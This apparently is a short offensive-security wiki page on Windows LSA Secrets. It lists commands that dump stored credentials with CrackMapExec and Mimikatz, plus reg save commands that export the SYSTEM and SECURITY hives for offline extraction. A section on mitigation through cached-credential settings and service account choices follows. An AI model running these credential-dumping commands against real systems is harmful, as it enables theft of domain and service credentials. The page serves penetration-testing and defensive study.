---
description: Additional information on LSA Secrets
---

# LSA Secrets

### Dumping LSA Secrets

Dumping LSA Secrets with CrackMapExec:

```bash
crackmapexec smb [HOST] -u [USER] -p [PASSWORD] --lsa
```

Dumping LSA Secrets with Mimikatz:

```bash
lsadump::secrets
```

Dumping LSA Secrets manually and then reading them with Mimikatz

```powershell
reg save HKLM\SYSTEM system & reg save HKLM\security security
lsadump::secrets /system:c:\temp\system /security:c:\temp\security
```

### Mitigations

When researching LSA Secrets on [MITRE](https://attack.mitre.org/techniques/T1003/004/) it appears as though the only mitigation to LSA Secrets being dumped is through detection. However, this is not the case.

The following settings can be configured to remove cached domain credentials from LSA Secrets:

```bash
Cached credential set to 0 on servers
Cached credential set to 1 on workstations
```

Additionally, when cleartext credentials are retrieved from LSA Secrets it is due to the credentials being stored for a service (E.g., creating a service with a custom user account). To mitigate this issue, avoid using a custom user account to create the service.&#x20;

### References

* [Dumping and Cracking mscash ](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials)
* [Preventing 4 Common Methods of Credentials Exfiltration](https://www.sentinelone.com/blog/windows-security-essentials-preventing-4-common-methods-of-credentials-exfiltration/)
* [Windows LSA Secrets](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=23)

